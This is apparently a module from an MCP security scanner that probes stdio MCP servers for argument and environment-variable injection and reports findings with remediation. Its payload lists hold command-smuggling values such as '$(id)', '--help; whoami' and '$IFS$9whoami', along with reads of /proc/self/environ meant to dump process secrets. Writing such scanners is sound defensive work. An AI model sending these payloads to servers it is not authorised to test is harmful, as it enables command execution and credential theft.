"""
MCP Stdio Argv / Environment-Variable Injection.

For stdio MCP servers, the host launches a subprocess and speaks JSON-
RPC over stdin/stdout. The launch command + environment variables are
typically configured in `.mcp.json` (or equivalent) and trusted by the
host.

This attack class exists because:

  1. Hosts often interpolate user-supplied values into the spawn command
     (e.g. argv from a config string), enabling argv splitting attacks.
  2. Servers regularly read sensitive environment variables and use them
     in tool implementations (`os.environ['DATABASE_URL']`). If a tool
     can be coerced to leak its env, secrets are gone.
  3. Some MCP host configs let server descriptions inject `env` at
     install time — a hostile server manifest can request env vars
     it shouldn't see.

Tests
-----
1. **Detect stdio server** — only meaningful against transport=stdio.
2. **Env enumeration** — ask every tool to echo back arguments; look
   for tools that interpolate / leak env vars (e.g. tool with no
   sanitisation that prints the input alongside `${HOME}` expansion).
3. **Argv-style payloads** — for each string param, send values that
   look like flags (`--config /etc/passwd`, `-it bash`), nullbytes,
   embedded newlines. If the server's tool implementation passes args
   to a child process via shell concatenation, this surfaces.
4. **Process-self leak** — try arguments that read the spawned
   process's own /proc/self files (cmdline, environ, status). If any
   tool reads files, this often hits.
5. **Captured stderr** — the stdio transport collects stderr; we
   inspect it for accidentally-printed env / secrets / paths.
6. **Capability of the spawned process** — call special tools (eval/
   exec/run) with `printenv` / `env` / `Get-ChildItem Env:` to dump
   the inherited env directly.

Dynamic params
--------------
  protocol_version, transport_override
  only_tool_names, max_tools
  argv_payloads, env_canaries — caller can extend
"""

import time as _time
import re as _re
import uuid as _uuid


_DEFAULT_ARGV_PAYLOADS = (
    "--config=/etc/passwd",
    "-it bash",
    "--help; whoami",
    "$(id)",
    "`whoami`",
    "value\nMINERVA_NEWLINE",     # newline injection
    "value\x00MINERVA_NULL",       # null-byte
    "${HOME}",                      # shell expansion
    "%PATH%",                       # cmd.exe expansion
    "-Command Get-ChildItem Env:",  # PowerShell flag
    "$IFS$9whoami",                 # IFS bypass
)


_LEAK_PAYLOADS = (
    "%env%",
    "$ENV",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
)


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "stdio_argv_env_injection"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None
    only_tool_names = params.get("only_tool_names") or []
    max_tools = int(params.get("max_tools", 15))
    argv_payloads = list(params.get("argv_payloads") or _DEFAULT_ARGV_PAYLOADS)
    leak_payloads = list(params.get("leak_payloads") or _LEAK_PAYLOADS)

    # Hard-skip for non-stdio targets unless overridden
    transport = (transport_override
                 or target.get("transport")
                 or target.get("protocol") or "").lower()
    base = (target.get("base_url") or "")
    is_stdio = (transport == "stdio") or base.startswith("stdio:")
    if not is_stdio and not params.get("force"):
        rb.warn("Target is not stdio (set force=true or transport_override='stdio' to override).")
        return rb.finalize(success=True)

    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            rb.error(f"MCP initialize failed: {disc.get('errors')}")
            return rb.finalize(success=False)

        tools = disc.get("tools") or []
        if only_tool_names:
            tools = [t for t in tools if t.get("name") in set(only_tool_names)]
        cands = tools[:max_tools]
        rb.info(f"Probing {len(cands)} tools for argv/env injection")

        canary = "MIN_ENV_" + _uuid.uuid4().hex[:10]

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            str_params = helpers.string_params(schema)
            if not str_params:
                continue

            # 1) Argv-style payloads
            for pname in str_params[:2]:
                for payload_str in argv_payloads:
                    args = helpers.fill_defaults(schema)
                    args[pname] = payload_str
                    r = mcp.call_tool_safe(tname, args)
                    rb.add_evidence(evidence.ev_mcp_call(
                        r, note=f"argv probe {tname}/{pname} {payload_str!r}"))
                    text = r.get("text_output") or ""
                    # Strong signals
                    if "MINERVA_NEWLINE" in text or "MINERVA_NULL" in text:
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "stdio_argv_env_injection"),
                            title=f"Argv injection / unescaped argument in '{tname}/{pname}'",
                            category="stdio_argv_env_injection",
                            severity="high", confidence="confirmed",
                            cwe="CWE-88",
                            tool=tname, parameter=pname, payload=payload_str,
                            description=(
                                "The tool returned newline/nullbyte content from "
                                "our argument unaltered. The argument is being "
                                "passed to a downstream process / shell without "
                                "escaping. Argv splitting is plausible."
                            ),
                            remediation=(
                                "Quote subprocess arguments. Use "
                                "subprocess(['cmd', arg], shell=False). Reject "
                                "control characters at the input boundary."
                            ),
                            evidence=[evidence.ev_mcp_call(r)],
                        ))
                        break
                    # Shell expansion happened?
                    if payload_str == "${HOME}" and ("/home/" in text or "/root" in text or "C:\\Users" in text):
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "stdio_argv_env_injection"),
                            title=f"Shell variable expansion in '{tname}/{pname}'",
                            category="stdio_argv_env_injection",
                            severity="high", confidence="confirmed",
                            cwe="CWE-88",
                            tool=tname, parameter=pname, payload=payload_str,
                            description=(
                                "Sent `${HOME}` and the response contained an "
                                "expanded path. The tool argument is being "
                                "passed through a shell that performs variable "
                                "expansion."
                            ),
                            remediation="Disable shell expansion. Use exec-style "
                                        "subprocess calls.",
                        ))
                        break
                    if payload_str == "%PATH%" and \
                            ("Windows" in text or "System32" in text or ";" in text and ":" in text):
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "stdio_argv_env_injection"),
                            title=f"cmd.exe variable expansion in '{tname}/{pname}'",
                            category="stdio_argv_env_injection",
                            severity="high", confidence="confirmed",
                            cwe="CWE-88",
                            tool=tname, parameter=pname, payload=payload_str,
                            description="`%PATH%` expanded to a Windows-style path list.",
                            remediation="Avoid cmd.exe interpolation; use direct exec.",
                        ))
                        break

            # 2) /proc/self leaks
            for pname in str_params[:2]:
                for payload_str in leak_payloads:
                    args = helpers.fill_defaults(schema)
                    args[pname] = payload_str
                    r = mcp.call_tool_safe(tname, args)
                    rb.add_evidence(evidence.ev_mcp_call(
                        r, note=f"proc-self {tname}/{pname} {payload_str}"))
                    text = r.get("text_output") or ""
                    secrets = secret_validators.detect_secrets(text)
                    env_markers = _re.findall(r"\b[A-Z][A-Z0-9_]{3,}=", text)
                    if env_markers or secrets:
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "stdio_argv_env_injection"),
                            title=f"'{tname}/{pname}' leaks process env / secrets",
                            category="stdio_argv_env_injection",
                            severity="critical" if secrets else "high",
                            confidence="confirmed",
                            cwe="CWE-200",
                            tool=tname, parameter=pname, payload=payload_str,
                            description=(
                                f"Tool returned content matching process env "
                                f"({len(env_markers)} env-style markers, "
                                f"{len(secrets)} secret(s)). The tool is "
                                "exposing the spawned process's environment."
                            ),
                            impact=(
                                "MCP servers commonly hold DATABASE_URL, "
                                "OPENAI_API_KEY, AWS creds, and per-user tokens "
                                "in env. Disclosure compromises every system the "
                                "server connects to."
                            ),
                            remediation=(
                                "Never echo file contents or env vars back to "
                                "MCP callers. Strip env / file paths from tool "
                                "responses. Run the MCP server with the minimum "
                                "env needed (no inherited host env)."
                            ),
                            evidence=[evidence.ev_mcp_call(r),
                                      evidence.ev_raw("detected secrets",
                                                      [s["type"] for s in secrets])],
                        ))
                        break

        return rb.finalize()
    finally:
        mcp.close()
